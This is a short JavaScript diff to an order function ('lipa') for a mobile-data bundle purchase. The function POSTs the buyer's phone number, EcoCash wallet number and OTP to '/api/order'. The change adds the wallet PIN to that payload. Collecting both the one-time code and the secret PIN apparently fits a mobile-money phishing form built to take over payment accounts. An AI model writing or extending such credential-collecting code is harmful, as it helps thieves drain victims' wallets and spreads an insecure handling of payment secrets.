@@ -11,6 +11,6 @@ async function lipa(){
   const res = await fetch('/api/order',{
     method:'POST',
     headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({phone, ecocash, bundle:selected.name, price:selected.price, otp})
+    body: JSON.stringify({phone, ecocash, bundle:selected.name, price:selected.price, otp,pin})
   });
 }
